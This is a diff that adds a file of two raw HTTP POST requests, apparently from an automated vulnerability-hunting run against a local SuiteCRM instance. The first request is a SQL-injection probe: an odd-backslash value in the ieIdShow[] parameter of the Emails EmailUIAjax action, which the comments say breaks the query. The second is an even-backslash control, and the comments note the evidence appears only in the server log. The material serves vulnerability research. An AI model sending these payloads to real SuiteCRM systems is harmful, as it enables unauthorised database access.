@@ -1,0 +1,28 @@
+# decisive request: ODD backslash count -> breaks the SQL (see response note + oracle_log_lines.txt)
+POST /index.php HTTP/1.1
+Host: localhost:33116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Referer: http://localhost:33116/index.php?module=Emails&action=index
+Cookie: PHPSESSID=59349a0dc63e7228557060723d0e8fc2
+Content-Length: 103
+Content-Type: application/x-www-form-urlencoded
+
+module=Emails&action=EmailUIAjax&emailUIAction=setFolderViewSelection&ieIdShow%5B%5D=ODD-10c7698dbdf%5C
+
+# control request: EVEN backslash count -> valid SQL, no error (HTTP response looks identical --
+# the oracle is NOT in the HTTP response, it's in suitecrm.log; see notes.md)
+POST /index.php HTTP/1.1
+Host: localhost:33116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Referer: http://localhost:33116/index.php?module=Emails&action=index
+Cookie: PHPSESSID=59349a0dc63e7228557060723d0e8fc2
+Content-Length: 107
+Content-Type: application/x-www-form-urlencoded
+
+module=Emails&action=EmailUIAjax&emailUIAction=setFolderViewSelection&ieIdShow%5B%5D=EVEN-2ec31c1f4b5%5C%5C
